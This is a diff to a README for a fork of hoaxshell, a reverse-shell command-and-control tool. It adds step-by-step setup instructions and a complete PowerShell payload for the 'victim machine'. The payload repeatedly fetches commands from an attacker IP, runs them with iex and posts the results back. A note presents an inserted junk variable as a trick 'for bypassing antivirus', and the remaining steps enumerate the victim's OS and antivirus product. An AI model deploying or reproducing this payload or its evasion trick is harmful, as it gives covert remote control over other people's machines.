@@ -27,39 +27,50 @@ This c2 concept (which could be implemented by using protocols other than http o
 
 ******
 ## Step Guides
-1. First, install all the requirements
+1. Install git, then clone the script from the github repository:
+
+    ```bash
+   sudo apt install git -y
+   git clone https://github.com/asepsaepdin/hoaxshell.git
+   ```
+
+2. Install the requirements using pip3 command:
 
    ```bash
+   sudo apt install python3-pip -y
+   cd hoaxshell
    sudo pip3 install -r requirements.txt
    ```
 
-2. Make the script executable
+3. Make the script executable
 
    ```bash
    chmod +x hoaxshell.py
    ```
 
-3. Run the script and specify  the **-s 192.168.25.72** with the perpetrator's address
+4. Run the script and specify  the **-s 192.168.25.72** with the perpetrator's address
 
    ```bash
    ./hoaxshell.py -s 192.168.25.72 -r -H "Authorization"
    ```
 
-> **Notes**: specify -s options with the attacker IP address
+   > **Notes**: specify -s options with the attacker IP address
 
-4. Run the script in powershell on the victim machine with some obfuscation technique
+6. Run the script in powershell on the victim machine with some obfuscation technique
 
    ```powershell
    $xxxxx='None';$s='192.168.25.72:8080';$i='7f588da6-a3488a4c-7fa96807';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/7f588da6 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/a3488a4c -Headers @{"Authorization"=$i}).Content;if ($c -ne $xxxxx) {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/7fa96807 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8} 
    ```
 
-5. Check the operating system information used by victim machine
+   > **Notes**: insert the $xxxxx='None'; string for bypassing antivirus
+
+7. Check the operating system information used by victim machine
 
    ```powershell
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
    ```
 
-6. And check the antivirus product used by victim machine
+8. And check the antivirus product used by victim machine
 
    ```powershell
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
